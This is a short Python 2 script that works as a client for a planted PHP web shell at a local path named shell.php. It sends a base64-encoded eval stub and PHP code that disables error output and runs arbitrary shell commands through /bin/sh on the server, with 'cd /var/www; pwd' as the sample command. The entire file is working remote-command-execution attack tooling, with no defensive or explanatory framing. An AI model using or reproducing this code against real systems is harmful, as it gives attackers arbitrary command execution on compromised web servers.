#!/usr/bin/env python
#-*- coding:utf-8 -*-

import base64
import urllib2

def encode(str):
    return base64.b64encode(str).replace('+','%2B').replace('/','%2F').replace('=','%3D')

def post_data(url, **z):
    a = '@eval(base64_decode($_POST[chr(122).chr(48)]));'
    
    data = "a=%s" % a

    if z.has_key('z0'):
        data += "&z0=%s" % (encode(z['z0']),)
    if z.has_key('z1'):
        data += "&z1=%s" % (encode(z['z1']),)        
    if z.has_key('z2'):
        data += "&z2=%s" % (encode(z['z2']),)        

    #print data
    ans = urllib2.urlopen(url, data)
    res = ans.read()
    #print res
    return res

if __name__ == '__main__':
    z0 = '''@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);echo("->|");$p=base64_decode($_POST["z1"]);$s=base64_decode($_POST["z2"]);$d=dirname($_SERVER["SCRIPT_FILENAME"]);$c=substr($d,0,1)=="/"?"-c '{$s}'":"/c {$s}";$r="{$p} {$c}";@system($r." 2>&1");;echo("|<-");die();'''
    z1 = "/bin/sh"
    z2 = 'cd "/var/www/";%s;echo [S];pwd;echo [E]' % ('pwd',)
    #print z0,z1,z2

    res = post_data('http://127.0.0.1/yun/shell.php', z0=z0, z1=z1, z2=z2)
    print res
